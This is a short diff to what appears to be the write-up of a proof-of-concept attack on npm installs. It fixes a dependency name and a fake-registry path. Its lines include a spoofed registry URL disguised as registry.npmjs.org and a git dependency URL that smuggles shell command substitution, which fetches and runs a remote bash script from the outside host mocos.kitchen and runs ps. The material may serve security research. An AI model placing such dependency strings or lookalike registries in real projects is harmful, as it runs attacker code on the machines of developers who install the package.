@@ -33,7 +33,7 @@ registry="http://registry.npmjs.org@mocos.kitchen/registry"
   "license": "MIT",
   "private": true,
   "dependencies": {
-    "package1.json": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
+    "package1": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
   }
 }
 ```
@@ -55,7 +55,7 @@ Following servers required.
 
 1. Fake npm registry
 
-`http://registry.npmjs.org@mocos.kitchen/package1` should return this file:
+`http://registry.npmjs.org@mocos.kitchen/registry/package1` should return this file:
 
 ```json
 {
